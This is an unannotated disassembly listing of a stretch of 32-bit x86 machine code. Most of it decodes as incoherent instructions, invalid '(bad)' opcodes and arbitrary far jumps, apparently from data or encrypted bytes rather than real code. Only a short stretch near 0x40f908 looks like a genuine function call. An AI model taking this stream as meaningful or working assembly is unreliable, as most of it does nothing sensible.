  40f469:	outs   dx,BYTE PTR ds:[esi]
  40f46a:	in     eax,0x1c
  40f46c:	sbb    DWORD PTR [eax+ebx*8-0x7c31d122],ecx
  40f473:	adc    esi,esp
  40f475:	lds    ebp,FWORD PTR [esi-0x3a]
  40f478:	into   
  40f479:	not    BYTE PTR [ebx+0x59ef25ba]
  40f47f:	or     bh,ah
  40f481:	inc    esp
  40f482:	lods   eax,DWORD PTR ds:[esi]
  40f483:	mov    ds:0x1ef05643,eax
  40f488:	xchg   esp,eax
  40f489:	shl    DWORD PTR [edi],1
  40f48b:	xchg   ebp,eax
  40f48c:	test   al,0x87
  40f48e:	nop
  40f48f:	push   es
  40f490:	push   ss
  40f491:	or     al,0x76
  40f493:	jb     0x40f457
  40f495:	and    eax,0x442592b6
  40f49a:	push   0xe7ffb622
  40f49f:	jp     0x40f428
  40f4a1:	test   eax,0x7b54c240
  40f4a6:	and    al,0x90
  40f4a8:	test   bl,bl
  40f4aa:	ds bnd ja 0x40f523
  40f4ae:	ror    BYTE PTR [ebx+0x51aaf40c],cl
  40f4b4:	rcl    DWORD PTR [edx-0x4c7ed925],1
  40f4ba:	inc    ecx
  40f4bb:	mov    ebx,0x9ab6f3d2
  40f4c0:	jmp    0x756c:0xb014f1f1
  40f4c7:	loopne 0x40f499
  40f4c9:	mov    ?,ebx
  40f4cb:	mov    ds:0x398c7b8,al
  40f4d0:	addr16 xchg edx,eax
  40f4d2:	mov    fs,edi
  40f4d4:	lods   al,BYTE PTR fs:[esi]
  40f4d6:	xlat   BYTE PTR ds:[ebx]
  40f4d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4d8:	xchg   BYTE PTR [edi+0x6c30bed9],dh
  40f4de:	or     bh,bh
  40f4e0:	loop   0x40f47f
  40f4e2:	pop    ebp
  40f4e3:	ss in  al,0x95
  40f4e6:	xchg   ebp,eax
  40f4e7:	xlat   BYTE PTR ds:[ebx]
  40f4e8:	das    
  40f4e9:	in     al,0xc0
  40f4eb:	lods   al,BYTE PTR ds:[esi]
  40f4ec:	push   ecx
  40f4ed:	hlt    
  40f4ee:	fs mov bl,0x54
  40f4f1:	adc    al,0x3a
  40f4f3:	js     0x40f4d5
  40f4f5:	sub    esi,DWORD PTR [edx-0x2f]
  40f4f8:	lds    ebx,FWORD PTR [ecx*2-0x1e5d367a]
  40f4ff:	mov    cl,0xc7
  40f501:	mov    esi,0xbd7ee8f
  40f506:	or     al,ch
  40f508:	pop    ebx
  40f509:	repnz mov dl,0xab
  40f50c:	xor    esi,esi
  40f50e:	mov    DWORD PTR [ebp-0x14],ecx
  40f511:	mov    eax,DWORD PTR [ebp-0x28]
  40f514:	jmp    0x40f908
  40f519:	sbb    al,0x75
  40f51b:	sar    DWORD PTR [esi+0x71b35a51],1
  40f521:	lahf   
  40f522:	popa   
  40f523:	sti    
  40f524:	arpl   WORD PTR [edx],si
  40f526:	jne    0x40f57d
  40f528:	and    esi,DWORD PTR [esi+0x497070af]
  40f52e:	jge    0x40f5a0
  40f530:	jo     0x40f5a7
  40f532:	pushf  
  40f533:	or     al,0xcb
  40f535:	jns    0x40f5b4
  40f537:	clc    
  40f538:	push   0x1f7e9689
  40f53d:	mov    DWORD PTR [edi-0xac63517],esi
  40f543:	jae    0x40f4f5
  40f545:	dec    ebp
  40f546:	adc    esi,DWORD PTR [edi]
  40f548:	mov    ds:0xd63356e7,al
  40f54d:	and    al,0xeb
  40f550:	popa   
  40f551:	nop
  40f552:	jno    0x40f507
  40f554:	sub    DWORD PTR [ecx+0x5b],ebp
  40f557:	sub    DWORD PTR gs:[esp+edi*4],eax
  40f55b:	push   ds
  40f55c:	mov    ebx,0x807b1545
  40f561:	adc    ch,BYTE PTR [esi+0xcc279e0]
  40f567:	(bad)  
  40f568:	sub    eax,0x9f58859c
  40f56d:	aas    
  40f56e:	fnsave [ebp+0x16ed7388]
  40f574:	loop   0x40f50d
  40f576:	fbld   TBYTE PTR [ecx+0x23]
  40f579:	mov    esp,0xfde56d65
  40f57e:	cli    
  40f57f:	shl    esi,cl
  40f581:	pushf  
  40f582:	and    esi,0xffffffb8
  40f585:	xchg   ecx,eax
  40f586:	cld    
  40f587:	rcl    DWORD PTR [ecx-0x2c],1
  40f58a:	inc    ecx
  40f58b:	test   al,0xaa
  40f58d:	or     DWORD PTR [edi+ecx*1+0x4483b815],esp
  40f594:	or     DWORD PTR [edi+0x49],0x6e
  40f598:	dec    ebx
  40f599:	gs or  cl,ah
  40f59c:	inc    eax
  40f59d:	repz push ebx
  40f59f:	cdq    
  40f5a0:	xchg   edi,eax
  40f5a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f5a2:	mov    bh,0x78
  40f5a4:	das    
  40f5a5:	cmp    al,0xef
  40f5a7:	mov    ch,BYTE PTR [ecx]
  40f5a9:	dec    ebp
  40f5aa:	and    al,0xe3
  40f5ac:	in     al,dx
  40f5ad:	lods   al,BYTE PTR ds:[esi]
  40f5ae:	push   0x78
  40f5b0:	cs pop esp
  40f5b2:	cmp    bl,BYTE PTR [esi+0x3d]
  40f5b5:	(bad)  
  40f5b6:	aad    0x75
  40f5b8:	loope  0x40f53a
  40f5ba:	and    eax,edx
  40f5bc:	sub    al,BYTE PTR [edx-0x3d]
  40f5bf:	mov    dl,0x63
  40f5c1:	xor    DWORD PTR [edx-0x5b],ebp
  40f5c4:	or     eax,0xcd431a
  40f5c9:	xor    al,BYTE PTR [ecx+0x27cc0b40]
  40f5cf:	int    0x32
  40f5d1:	sbb    ecx,DWORD PTR [edi-0x2eeff798]
  40f5d7:	xchg   ebx,eax
  40f5d8:	ja     0x40f5a0
  40f5da:	sub    BYTE PTR [esi],cl
  40f5dc:	cdq    
  40f5dd:	aad    0xe
  40f5df:	jmp    0x40f5db
  40f5e1:	test   DWORD PTR [ebp-0x7e],edi
  40f5e4:	nop
  40f5e5:	add    dh,BYTE PTR [ebx+0x666c3259]
  40f5eb:	cmp    al,BYTE PTR [ecx-0x4ba07e09]
  40f5f1:	xchg   edi,eax
  40f5f2:	inc    esp
  40f5f3:	jg     0x40f64d
  40f5f5:	cs out 0x51,eax
  40f5f8:	imul   esp
  40f5fa:	jl     0x40f608
  40f5fc:	lods   al,BYTE PTR fs:[esi]
  40f5fe:	xchg   ecx,eax
  40f5ff:	mov    esp,DWORD PTR [esi-0xc]
  40f602:	pop    edi
  40f603:	xor    cl,ch
  40f605:	mov    ebp,0xb776f2f0
  40f60a:	sub    DWORD PTR [ecx+0x5219df4d],eax
  40f610:	add    dh,ch
  40f612:	lds    ebx,FWORD PTR [edx+0x7c3c89a2]
  40f618:	adc    DWORD PTR ds:0x1e11e96,eax
  40f61e:	cmp    esi,DWORD PTR [eax]
  40f620:	inc    edi
  40f621:	dec    ebp
  40f622:	test   al,0x6c
  40f624:	jo     0x40f65b
  40f626:	or     BYTE PTR [ecx+0x136088c3],ch
  40f62c:	pop    ecx
  40f62d:	imul   esi,DWORD PTR [edi+0x2a5ccd89],0x360d1a1f
  40f637:	fs push esp
  40f639:	loopne 0x40f695
  40f63b:	sbb    edi,DWORD PTR [edi-0x696099de]
  40f641:	imul   edi,DWORD PTR [edi-0x1890ab86],0x5c2d3f89
  40f64b:	fisttp WORD PTR [ebx-0x1b]
  40f64e:	dec    ebx
  40f64f:	test   BYTE PTR [ecx+eiz*1+0x33af9a7c],ch
  40f656:	gs (bad) 
  40f658:	out    0x6a,eax
  40f65a:	inc    edx
  40f65b:	add    esp,DWORD PTR [edi-0x4f62c36e]
  40f661:	jecxz  0x40f5e9
  40f663:	cld    
  40f664:	es dec edx
  40f666:	(bad)  
  40f667:	outs   dx,DWORD PTR ds:[esi]
  40f668:	xchg   DWORD PTR [ecx+0x7592672],ebp
  40f66e:	inc    ecx
  40f66f:	and    cl,BYTE PTR [ebx+0x4b]
  40f672:	mov    BYTE PTR [edi+0x7801a958],dl
  40f678:	pop    ds
  40f679:	std    
  40f67a:	neg    DWORD PTR [edi]
  40f67c:	sbb    BYTE PTR [ebx+eiz*8+0x2ce0bbdb],bh
  40f683:	clc    
  40f684:	outs   dx,BYTE PTR ds:[esi]
  40f685:	sbb    al,0xd2
  40f687:	dec    esi
  40f688:	sub    eax,0x18d3b576
  40f68d:	pop    edx
  40f68e:	mov    ds:0x4fc1c6f,eax
  40f693:	add    eax,0xb639ddc
  40f698:	pop    ebp
  40f699:	sbb    DWORD PTR [edx-0x57],esi
  40f69c:	(bad)  
  40f69e:	hlt    
  40f69f:	sub    BYTE PTR [edx-0xb3ca87],dl
  40f6a5:	pop    es
  40f6a6:	jg     0x40f651
  40f6a8:	test   ah,bh
  40f6aa:	loope  0x40f684
  40f6ac:	xlat   BYTE PTR ds:[ebx]
  40f6ad:	add    al,0x3
  40f6af:	jb     0x40f6d0
  40f6b1:	xchg   edx,eax
  40f6b2:	mov    al,0x10
  40f6b4:	sbb    eax,0x9111271c
  40f6b9:	inc    edi
  40f6ba:	(bad)
  40f6bd:	das    
  40f6be:	mov    ds:0x1940e4a0,eax
  40f6c3:	mov    eax,ds:0x6074aaeb
  40f6c8:	adc    DWORD PTR [ebx+eiz*8],edi
  40f6cb:	js     0x40f698
  40f6cd:	call   0x4114:0x16109b9c
  40f6d4:	jp     0x40f727
  40f6d6:	loop   0x40f74d
  40f6d8:	adc    BYTE PTR [edx-0x4c],cl
  40f6db:	xlat   BYTE PTR ds:[ebx]
  40f6dc:	icebp  
  40f6dd:	addr16 test eax,0x88aeed12
  40f6e3:	xor    BYTE PTR [ebx+0xe56167b],cl
  40f6e9:	js     0x40f747
  40f6eb:	je     0x40f6fe
  40f6ed:	test   BYTE PTR [edx-0x6e],al
  40f6f0:	mov    ebp,DWORD PTR [ebx-0x61]
  40f6f3:	fcmovnu st,st(5)
  40f6f5:	push   ss
  40f6f6:	xchg   ecx,eax
  40f6f7:	mov    ebp,0x5aaa9156
  40f6fc:	jne    0x6f8c4023
  40f702:	imul   ebx,DWORD PTR [ebp+0x6fed37c7],0xffffff89
  40f709:	nop
  40f70a:	div    dh
  40f70c:	xor    DWORD PTR [ecx],edx
  40f70e:	test   dh,dh
  40f710:	sub    esi,edi
  40f712:	cld    
  40f713:	jecxz  0x40f76a
  40f715:	shl    esi,0x7e
  40f718:	test   BYTE PTR [edx+eax*8],dl
  40f71b:	or     al,0x62
  40f71d:	jg     0x40f6d3
  40f71f:	and    DWORD PTR ds:0xcfe68a5d,edi
  40f725:	jne    0x40f788
  40f727:	ins    BYTE PTR es:[edi],dx
  40f728:	adc    al,0xb2
  40f72a:	fnstcw WORD PTR fs:[edx-0x7d1f008b]
  40f731:	idiv   ah
  40f733:	xchg   ecx,esi
  40f735:	mov    BYTE PTR [ebp-0x11],cl
  40f738:	inc    esi
  40f739:	xchg   ebx,eax
  40f73a:	aaa    
  40f73b:	std    
  40f73c:	mov    ds:0xee94b76a,eax
  40f741:	xor    edi,esp
  40f743:	add    DWORD PTR [edi-0x288d102a],esi
  40f749:	ins    BYTE PTR es:[edi],dx
  40f74a:	in     eax,dx
  40f74b:	mov    ebx,0x4899fdb
  40f750:	mov    ds:0x6da73701,al
  40f755:	mov    eax,ds:0xcd296eec
  40f75a:	cli    
  40f75b:	mov    cs,WORD PTR [edi-0x51ebf599]
  40f761:	stos   DWORD PTR es:[edi],eax
  40f762:	popf   
  40f763:	(bad)  
  40f764:	ins    BYTE PTR es:[edi],dx
  40f765:	and    eax,0xf09c5eb9
  40f76a:	arpl   WORD PTR [ebx-0x42c53269],ax
  40f770:	daa    
  40f771:	fistp  QWORD PTR [ecx]
  40f773:	das    
  40f774:	loop   0x40f744
  40f776:	retf   0x7734
  40f779:	mov    ah,0x46
  40f77b:	inc    ecx
  40f77c:	xchg   ecx,eax
  40f77d:	push   es
  40f77e:	push   ss
  40f77f:	push   cs
  40f780:	bound  eax,QWORD PTR [eax+0x51]
  40f783:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f784:	call   0x10cb:0x21dc00c8
  40f78b:	retf   0x3314
  40f78e:	in     al,0x1e
  40f790:	pop    ds
  40f791:	xchg   DWORD PTR [esi-0x58106104],esi
  40f797:	jg     0x40f7b2
  40f799:	ror    DWORD PTR [eax],1
  40f79b:	inc    edi
  40f79c:	push   edx
  40f79d:	inc    ecx
  40f79e:	aas    
  40f79f:	test   eax,0x2cdba0ba
  40f7a4:	faddp  st(4),st
  40f7a6:	call   0xfa85679
  40f7ab:	neg    BYTE PTR [esi+0x58]
  40f7ae:	push   cs
  40f7af:	loop   0x40f733
  40f7b1:	loop   0x40f797
  40f7b3:	push   ecx
  40f7b4:	stc    
  40f7b5:	nop
  40f7b6:	sbb    eax,ebx
  40f7b8:	lahf   
  40f7b9:	adc    DWORD PTR [ebp+0x79e01b14],0xf03a8cfb
  40f7c3:	mov    eax,ds:0x54a6b6aa
  40f7c8:	(bad)  
  40f7ca:	inc    eax
  40f7cb:	dec    BYTE PTR [ebx-0x293e1b66]
  40f7d1:	xchg   edx,eax
  40f7d2:	and    al,0x11
  40f7d4:	bound  eax,QWORD PTR [ecx]
  40f7d6:	cwde   
  40f7d7:	adc    ecx,DWORD PTR [esi]
  40f7d9:	out    0xad,eax
  40f7db:	mov    ds:0xf6e22e71,eax
  40f7e0:	fidiv  WORD PTR [ebp-0x42]
  40f7e3:	inc    edx
  40f7e4:	fstp   TBYTE PTR [ebx-0x1c]
  40f7e7:	xor    BYTE PTR [edi],dl
  40f7e9:	js     0x40f7fb
  40f7eb:	int3   
  40f7ec:	(bad)  
  40f7ee:	jns    0x40f840
  40f7f0:	xor    dh,ah
  40f7f2:	pop    ecx
  40f7f3:	xor    ebp,DWORD PTR [esi-0xb1a6c57]
  40f7f9:	add    BYTE PTR cs:[ecx-0x6dc3014c],0x2
  40f801:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f802:	rcr    cl,1
  40f804:	inc    edx
  40f805:	pop    ecx
  40f806:	ins    DWORD PTR es:[edi],dx
  40f807:	xor    DWORD PTR [edx],esp
  40f809:	test   DWORD PTR [ebx],eax
  40f80b:	pop    eax
  40f80c:	fwait
  40f80d:	jne    0x40f7f4
  40f80f:	pop    ecx
  40f810:	je     0x40f888
  40f812:	dec    ebp
  40f813:	retf   
  40f814:	mov    bh,0x6d
  40f816:	jp     0x40f7e5
  40f818:	add    eax,0x776971d3
  40f81d:	(bad)  
  40f81e:	sar    dl,0xee
  40f821:	cld    
  40f822:	sahf   
  40f823:	ret    
  40f824:	mov    ebx,DWORD PTR [edx-0x13]
  40f827:	dec    eax
  40f828:	dec    edi
  40f829:	adc    esp,eax
  40f82b:	outs   dx,BYTE PTR ds:[esi]
  40f82c:	aam    0x59
  40f82e:	test   al,0x48
  40f830:	or     BYTE PTR [ecx+0x4d],al
  40f833:	(bad)  
  40f834:	push   esi
  40f835:	je     0x40f896
  40f837:	xor    BYTE PTR [edi+edx*8+0x3b32b088],dh
  40f83e:	rol    BYTE PTR [esp+edi*1-0x55],cl
  40f842:	xor    ecx,esp
  40f844:	mov    cl,0x2d
  40f846:	ror    DWORD PTR ss:[ebx-0x10],1
  40f84a:	iret   
  40f84b:	popf   
  40f84c:	mov    ds:0x5b324b57,al
  40f851:	addr16 retf 
  40f853:	(bad)  
  40f854:	sbb    eax,0xfde28f12
  40f859:	jnp    0x40f891
  40f85b:	stc    
  40f85c:	outs   dx,DWORD PTR ds:[esi]
  40f85d:	imul   esi,esp,0x2df4c8a6
  40f863:	sub    eax,0x2a63cc9f
  40f868:	dec    ebp
  40f869:	into   
  40f86a:	dec    ebp
  40f86b:	rcl    BYTE PTR [edx+0x555fb6ac],cl
  40f871:	xor    DWORD PTR [ebx-0x6f355dca],0xb6c7f55
  40f87b:	mov    esi,0x57c184ba
  40f880:	mov    esi,0xdd7f4c0
  40f885:	jg     0x40f8ca
  40f887:	mov    cl,BYTE PTR [ebx]
  40f889:	imul   esi,edi,0xb1f7c34d
  40f88f:	fisttp DWORD PTR [eax]
  40f891:	sar    DWORD PTR [ecx-0x10],1
  40f894:	rcr    DWORD PTR [ebp+0x5c],cl
  40f897:	pusha  
  40f898:	pop    edi
  40f899:	out    0xe1,al
  40f89b:	and    eax,0x60fe5493
  40f8a0:	(bad)  
  40f8a1:	push   ebx
  40f8a2:	cdq    
  40f8a3:	cmp    DWORD PTR [eax-0x3abd556c],esp
  40f8a9:	or     dh,BYTE PTR [eax]
  40f8ab:	add    DWORD PTR [ecx-0x56],ebx
  40f8ae:	jns    0x40f8be
  40f8b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8b1:	pop    ecx
  40f8b2:	ins    BYTE PTR es:[edi],dx
  40f8b3:	jmp    FWORD PTR [ebp-0x68605c1b]
  40f8b9:	add    ah,BYTE PTR [ebp+0x5075ecbe]
  40f8bf:	pusha  
  40f8c0:	inc    edx
  40f8c1:	jge    0x40f927
  40f8c3:	dec    esi
  40f8c4:	mov    edi,0xe1b9458b
  40f8c9:	arpl   WORD PTR [eax+eiz*8+0x46159526],cx
  40f8d0:	inc    ebx
  40f8d1:	ret    
  40f8d2:	xchg   ecx,eax
  40f8d3:	aad    0x5c
  40f8d5:	(bad)  
  40f8d6:	adc    eax,0xf46b9768
  40f8db:	mov    edi,0xda5c034
  40f8e0:	push   0xffffffe0
  40f8e2:	lods   eax,DWORD PTR ds:[esi]
  40f8e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8e4:	sbb    BYTE PTR [edi],dh
  40f8e6:	jg     0x40f8db
  40f8e8:	aaa    
  40f8e9:	mov    bl,0xe4
  40f8eb:	push   esi
  40f8ec:	ds ins BYTE PTR es:[edi],dx
  40f8ee:	sahf   
  40f8ef:	add    DWORD PTR [eax+0x54],0xffffffc9
  40f8f3:	jg     0x40f963
  40f8f5:	out    dx,al
  40f8f6:	shr    BYTE PTR [ebp+ebp*2-0x6af688a1],1
  40f8fd:	or     DWORD PTR [ebp-0x4712ebc0],ebp
  40f903:	inc    edx
  40f904:	popa   
  40f905:	dec    esi
  40f906:	sti    
  40f907:	push   ebp
  40f908:	mov    ecx,DWORD PTR [ebp+0x8]
  40f90b:	add    ecx,DWORD PTR [eax+edi*4]
  40f90e:	lea    eax,[ebp-0x8]
  40f911:	mov    DWORD PTR [ebp-0x30],ecx
  40f914:	push   eax
  40f915:	push   DWORD PTR [ebp-0x30]
  40f918:	push   DWORD PTR [ebp+0xc]
  40f91b:	call   0x403925
  40f920:	mov    eax,DWORD PTR [ebp-0x4]
  40f923:	mov    ecx,DWORD PTR [ebp-0x8]
  40f926:	jmp    0x40fd1a
  40f92b:	or     DWORD PTR ds:[edi],eax
  40f92e:	(bad)  
  40f92f:	rcl    edx,cl
  40f931:	cmp    DWORD PTR [ecx],edx
  40f933:	pop    ecx
  40f934:	jns    0x40f901
  40f936:	popa   
  40f937:	mov    eax,0x8f43f4e6
  40f93c:	stos   DWORD PTR es:[edi],eax
  40f93d:	jo     0x40f9af
  40f93f:	dec    ecx
  40f940:	jge    0x40f9b2
  40f942:	jo     0x40f8e0
  40f944:	(bad)
  40f947:	and    DWORD PTR [edi-0x16],ebx
  40f94a:	sub    bl,BYTE PTR [ebx+esi*8+0x5c]
  40f94e:	pop    es
  40f94f:	icebp  
  40f950:	mov    dl,0x59
  40f952:	push   0x15
  40f954:	mov    ebp,0x96e1ebae
  40f959:	inc    esi
  40f95a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f95b:	ins    BYTE PTR es:[edi],dx
  40f95c:	xor    al,0x73
  40f95e:	cld    
  40f95f:	mov    dl,0xd7
  40f961:	fidiv  DWORD PTR [edx]
  40f963:	call   0x6e12:0x18dacbfc
  40f96a:	mov    ss,WORD PTR [esp+edx*4-0x40b5cedd]
  40f971:	scas   eax,DWORD PTR es:[edi]
  40f972:	jae    0x40f983
  40f974:	jne    0x40f992
  40f976:	add    al,0x8
  40f978:	xchg   ebp,eax
  40f979:	aad    0x90
  40f97b:	scas   eax,DWORD PTR es:[edi]
  40f97c:	popa   
  40f97d:	or     BYTE PTR [eax+0xe],al
  40f980:	xchg   edx,eax
  40f981:	push   ecx
  40f982:	push   es
  40f983:	out    dx,eax
  40f984:	cmp    DWORD PTR [edi+0x59e77651],esi
  40f98a:	adc    eax,0x6d58e1dd
  40f98f:	into   
  40f990:	div    BYTE PTR [ebx+0x297b1ed2]
  40f996:	dec    eax
  40f997:	outs   dx,DWORD PTR ds:[esi]
  40f998:	imul   BYTE PTR [edi-0x3e]
  40f99b:	jae    0x40f91f
  40f99d:	dec    esi
  40f99e:	daa    
  40f99f:	(bad)  
  40f9a0:	pop    ebp
  40f9a1:	xchg   edx,eax
  40f9a2:	mov    eax,ds:0xc247c9db
  40f9a7:	arpl   WORD PTR [ebx+0x14e3bac9],bx
  40f9ad:	push   eax
  40f9ae:	add    bl,BYTE PTR [ebp+0x20]
  40f9b1:	mov    ?,WORD PTR [edi+eax*4]
  40f9b4:	je     0x40f945
  40f9b6:	sub    eax,0xc2e02cd0
  40f9bb:	iret   
  40f9bc:	aam    0x90
  40f9be:	outs   dx,BYTE PTR ds:[esi]
  40f9bf:	ret    0xe125
  40f9c2:	mov    ecx,0xd4391b06
  40f9c7:	jae    0x40fa0c
  40f9c9:	ins    BYTE PTR es:[edi],dx
  40f9ca:	inc    esi
  40f9cb:	ret    0xab31
  40f9ce:	sahf   
  40f9cf:	xchg   ecx,eax
  40f9d0:	retf   
  40f9d1:	pop    edi
  40f9d2:	or     DWORD PTR [ebp+0x69],ebp
  40f9d5:	test   al,0xf5
  40f9d7:	and    al,0xa9
  40f9d9:	jbe    0x40f96a
  40f9db:	daa    
  40f9dc:	in     al,dx
  40f9dd:	mov    BYTE PTR [ebx],ah
  40f9df:	xchg   ebx,eax
  40f9e0:	inc    esp
  40f9e1:	jb     0x40f9d9
  40f9e3:	inc    eax
  40f9e4:	and    esi,ecx
  40f9e6:	add    eax,0xcac924a7
  40f9eb:	push   esi
  40f9ec:	out    0x17,al
  40f9ee:	jne    0x40f9a7
  40f9f0:	cmc    
  40f9f1:	test   eax,0x86e635b8
  40f9f6:	dec    DWORD PTR [ebp-0x32bd213f]
  40f9fc:	stos   DWORD PTR es:[edi],eax
  40f9fd:	fadd   DWORD PTR [ebx-0x419521ae]
  40fa03:	pop    esp
  40fa04:	icebp  
  40fa05:	dec    eax
  40fa06:	add    al,0x5f
  40fa08:	mov    al,ds:0x34812bf0
  40fa0d:	fcmovu st,st(0)
  40fa0f:	cwde   
  40fa10:	cli    
  40fa11:	sbb    al,0x82
  40fa13:	mov    cl,0x5d
  40fa15:	inc    esp
  40fa16:	jne    0x40f9d5
  40fa18:	dec    ebp
  40fa19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa1a:	gs or  al,0x2a
  40fa1d:	pop    edi
  40fa1e:	dec    ebx
  40fa1f:	add    dl,dh
  40fa21:	(bad)  
  40fa22:	sar    BYTE PTR [edi+0xf],cl
  40fa25:	push   es
  40fa26:	xchg   BYTE PTR [edi-0x265a5000],al
  40fa2c:	(bad)  
  40fa2d:	loopne 0x40fa28
  40fa2f:	cdq    
  40fa30:	in     al,dx
  40fa31:	repnz cmp DWORD PTR [esi-0x5],esp
  40fa35:	mov    eax,0x4a56f6b3
  40fa3a:	cld    
  40fa3b:	ret    
  40fa3c:	inc    ebp
  40fa3d:	mov    edi,0xacc09c9a
  40fa42:	sbb    ebp,DWORD PTR [edi+edx*1+0x2b6b1260]
  40fa49:	pop    ebx
  40fa4a:	mov    edi,0x6b36ba71
  40fa4f:	test   DWORD PTR cs:[esi-0x50],edx
  40fa53:	adc    DWORD PTR [ebp+esi*8+0x63f30fb5],esp
  40fa5a:	inc    edi
  40fa5b:	jecxz  0x40fa5f
  40fa5d:	push   ecx
  40fa5e:	inc    edi
  40fa5f:	push   eax
  40fa60:	xchg   ecx,eax
  40fa61:	push   esp
  40fa62:	inc    eax
  40fa63:	ficom  WORD PTR [edi-0xafdfb58]
  40fa69:	cld    
  40fa6a:	ret    0xfa43
  40fa6d:	ins    DWORD PTR es:[edi],dx
  40fa6e:	test   ebp,0x52002f85
  40fa74:	(bad)  
  40fa75:	bound  ebp,QWORD PTR [edx]
  40fa77:	mov    WORD PTR [esi-0x5d858b4b],es
  40fa7d:	pop    edi
  40fa7e:	(bad)  
  40fa7f:	mov    esi,0x9c5f0a9d
  40fa84:	stos   DWORD PTR es:[edi],eax
  40fa85:	and    al,0xc9
  40fa87:	scas   al,BYTE PTR es:[edi]
  40fa88:	sub    edi,eax
  40fa8a:	outs   dx,DWORD PTR ds:[esi]
  40fa8b:	(bad)  
  40fa8d:	enter  0x4de6,0x30
  40fa91:	adc    ch,al
  40fa93:	(bad)  
  40fa94:	xchg   ecx,eax
  40fa95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa96:	ins    BYTE PTR es:[edi],dx
  40fa97:	pop    esi
  40fa98:	dec    eax
  40fa99:	aas    
  40fa9a:	xchg   esp,eax
  40fa9b:	xchg   esi,eax
  40fa9c:	aaa    
  40fa9d:	and    BYTE PTR [esi+edx*1+0x4c],cl
  40faa1:	pusha  
  40faa2:	ja     0x40fb17
  40faa4:	mov    eax,0x155faea3
  40faa9:	pushf  
  40faaa:	loop   0x40faf1
  40faac:	xchg   esi,eax
  40faad:	ss pop edi
  40faaf:	sar    ebx,0x62
  40fab2:	ret    
  40fab3:	data16 lock mov ds:0xb77e3044,al
  40faba:	mov    eax,ds:0x1387ab87
  40fabf:	jo     0x40fab2
  40fac1:	mov    ah,BYTE PTR [eax-0x77]
  40fac4:	jmp    0x7f2a:0x83f83974
  40facb:	retf   
  40facc:	jecxz  0x40fad0
  40face:	idiv   edx
  40fad0:	pusha  
  40fad1:	xor    ch,ch
  40fad3:	pop    esp
  40fad4:	test   BYTE PTR [ebp+ebp*8+0x1071a131],cl
  40fadb:	push   cs
  40fadc:	bound  esi,QWORD PTR [ebp-0x6670f96b]
  40fae2:	mov    bl,0x13
  40fae4:	mov    esi,0x76246e64
  40fae9:	into   
  40faea:	push   eax
  40faeb:	pop    ebp
  40faec:	mov    dl,0x79
  40faee:	call   FWORD PTR [esi+0x6c]
  40faf1:	clc    
  40faf2:	sbb    BYTE PTR [esp+ebp*4-0x73],ah
  40faf6:	mov    bl,BYTE PTR [ebp+0x36]
  40faf9:	lods   eax,DWORD PTR ds:[esi]
  40fafa:	xchg   DWORD PTR [eax+esi*1-0x555447e9],edx
  40fb01:	mov    ebp,0x996a1efe
  40fb06:	sub    DWORD PTR [ecx-0x3165bf75],ebx
  40fb0c:	aad    0x7e
  40fb0e:	stos   BYTE PTR es:[edi],al
  40fb0f:	mov    ds:0x90f7803e,eax
  40fb14:	je     0x40fb85
  40fb16:	daa    
  40fb17:	test   eax,0x7268c9a8
  40fb1c:	lock mov edx,0xdd242549
  40fb22:	outs   dx,DWORD PTR ds:[esi]
  40fb23:	mov    ds:0xc077a286,al
  40fb28:	push   ebp
  40fb29:	xor    ecx,eax
  40fb2b:	xchg   ebp,eax
  40fb2c:	scas   eax,DWORD PTR es:[edi]
  40fb2d:	out    dx,eax
  40fb2e:	pop    ebp
  40fb2f:	lds    eax,FWORD PTR [ebp+eax*8+0x44b402ba]
  40fb36:	pusha  
  40fb37:	push   0xffffffc3
  40fb39:	mov    cl,ch
  40fb3b:	or     BYTE PTR [ecx],ch
  40fb3d:	(bad)  
  40fb3e:	popf   
  40fb3f:	adc    esp,DWORD PTR ds:0xdb022c9b
  40fb45:	daa    
  40fb46:	mov    ch,0x6c
  40fb48:	xlat   BYTE PTR ds:[ebx]
  40fb49:	repz in eax,0x60
  40fb4c:	mul    DWORD PTR [esi-0x69]
  40fb4f:	xchg   esp,eax
  40fb50:	sbb    eax,0xbb2fcae2
  40fb55:	repnz sbb BYTE PTR [edi],dh
  40fb58:	inc    esi
  40fb59:	xor    BYTE PTR [edi-0x6724d469],cl
  40fb5f:	xchg   edx,eax
  40fb60:	jns    0x40fb7f
  40fb62:	lea    ebp,[eax-0x2c7c859]
  40fb68:	sbb    ebx,esp
  40fb6a:	lods   al,BYTE PTR ds:[esi]
  40fb6b:	fdivr  QWORD PTR [ebx+0x1dd1f5f1]
  40fb71:	jecxz  0x40fb4f
  40fb73:	xchg   esp,eax
  40fb74:	fild   QWORD PTR [ecx]
  40fb76:	inc    ebx
  40fb77:	push   cs
  40fb78:	sub    bh,cl
  40fb7a:	ret    0x99b6
  40fb7d:	inc    ebx
  40fb7e:	fdiv   QWORD PTR [eax+0x5d]
  40fb81:	adc    al,0x68
  40fb83:	jmp    0x6cc:0xb5982e35
  40fb8a:	adc    ah,BYTE PTR [ebx+0x44]
  40fb8d:	lea    edx,[edi+0x6e0fc9dc]
  40fb93:	add    al,BYTE PTR [ebx-0x48ba0715]
  40fb99:	in     eax,dx
  40fb9a:	mov    edx,0xc8aa6078
  40fb9f:	mov    esi,0xd6145efb
  40fba4:	ror    ebp,0x3a
  40fba7:	fdiv   DWORD PTR [esi+0xd]
  40fbaa:	push   ss
  40fbab:	pop    eax
  40fbac:	(bad)  
  40fbad:	hlt    
  40fbae:	inc    esp
  40fbaf:	cmp    BYTE PTR [edi-0x25588040],al
  40fbb5:	adc    BYTE PTR [esi+0x12],dh
  40fbb8:	xor    eax,0xbfa1fc88
  40fbbd:	ja     0x40fc37
  40fbbf:	les    ebx,FWORD PTR [ebp-0x4b2d228c]
  40fbc5:	pop    ebp
  40fbc6:	ror    ah,cl
  40fbc8:	push   ecx
  40fbc9:	int3   
  40fbca:	sbb    edx,DWORD PTR [ebp-0x58]
  40fbcd:	sub    al,0xbc
  40fbcf:	stc    
  40fbd0:	xchg   ebx,eax
  40fbd1:	sub    ecx,ebx
